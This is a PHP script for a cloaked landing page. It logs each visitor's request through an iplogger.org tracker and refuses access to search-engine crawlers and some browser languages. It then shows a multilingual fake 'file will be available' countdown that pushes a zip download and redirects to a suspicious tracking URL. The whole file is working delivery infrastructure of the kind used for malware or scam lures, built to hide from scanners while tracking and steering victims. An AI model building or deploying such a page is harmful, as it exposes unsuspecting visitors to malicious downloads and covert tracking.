<?php
// Configuration
$config = [
    'enable_redirect' => true, // Enable redirect
    'blocked_bots' => true, // Ban for search engine robots
    'blocked_languages' => ['zqh'], // Blocked browser languages 
    'redirect_delay' => 5, // Delay before redirect (in seconds)
    'desktop_links' => [
        'https://z9eqas.mcgo2.com/visit/0fd7556a-e879-4403-9638-2aeaeb54c7e6', 
        'https://z9eqas.mcgo2.com/visit/0fd7556a-e879-4403-9638-2aeaeb54c7e6',
    ], // PC Links
    'mobile_links' => [
        'https://z9eqas.mcgo2.com/visit/0fd7556a-e879-4403-9638-2aeaeb54c7e6', 
        'https://z9eqas.mcgo2.com/visit/0fd7556a-e879-4403-9638-2aeaeb54c7e6',
    ], // Links for mobile
    'confirmation_required' => true, // Show form before redirect
    'download_file' => 'example.zip', // File for download via the button
    'log_service' => 'https://iplogger.org/your-logger-url', // Logging via iplogger.org
    'text_content' => [
        'en' => ['title' => 'File will be available in', 'message' => 'Please wait or click the button below to download the file.'],
        'ru' => ['title' => 'Файл будет доступен через', 'message' => 'Пожалуйста, подождите или нажмите кнопку ниже, чтобы скачать файл.'],
        'es' => ['title' => 'El archivo estará disponible en', 'message' => 'Espere o haga clic en el botón de abajo para descargar el archivo.'],
        'fr' => ['title' => 'Le fichier sera disponible dans', 'message' => 'Veuillez patienter ou cliquez sur le bouton ci-dessous pour télécharger le fichier.']
    ]
];
 
// Visit logging via cURL
function log_visit($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_exec($ch);
    curl_close($ch);
}
log_visit($config['log_service']);
 
// Check the bot
if ($config['blocked_bots']) {
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    $bots = ['googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'duckduckbot'];
    foreach ($bots as $bot) {
        if (strpos($user_agent, $bot) !== false) {
            die('Access Denied');
        }
    }
}
 
// Determining the browser language
function get_browser_language() {
    return substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
}
 
$lang = get_browser_language();
$text = $config['text_content'][$lang] ?? $config['text_content']['en'];
 
if (in_array($lang, $config['blocked_languages'])) {
    die('Access Denied');
}
 
// Device definition
$is_mobile = preg_match('/(android|iphone|ipad|ipod|mobile|blackberry|opera mini|iemobile)/i', $_SERVER['HTTP_USER_AGENT']);
$redirect_links = $is_mobile ? $config['mobile_links'] : $config['desktop_links'];
$redirect_url = $redirect_links[array_rand($redirect_links)];
 
// Form before redirect
if ($config['confirmation_required']) {
    echo "<html><head><meta charset='UTF-8'>
          <meta http-equiv='refresh' content='{$config['redirect_delay']};url={$redirect_url}'>
          <title>{$text['title']} {$config['redirect_delay']} секунд</title>
          <style>
              body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f9f9f9; transition: background 0.5s; }
              .container { max-width: 400px; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); transition: background 0.5s; }
              h2 { color: #333; }
              p { color: #666; }
              button { padding: 10px 20px; background: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer; }
              button:hover { background: #0056b3; }
              @media (prefers-color-scheme: dark) {
                  body { background-color: #121212; color: white; }
                  .container { background: #1e1e1e; color: white; }
                  h2, p { color: white; }
              }
          </style>
          <script>
              function downloadAndRedirect() {
                  window.location.href = '{$config['download_file']}';
                  setTimeout(function() { window.location.href = '{$redirect_url}'; }, 2000);
              }
          </script>
          </head>
          <body>
		  

          <div class='container'>
              <h2>{$text['title']} {$config['redirect_delay']} секунд</h2>
              <p>{$text['message']}</p>
              <button onclick='downloadAndRedirect()'>Скачать файл</button>
          </div>
		 
          </body>
		  
          </html>";
    exit;
}
 
// Waiting before redirecting
sleep($config['redirect_delay']);
 
// Redirect after delay
header("Location: {$redirect_url}");
exit;

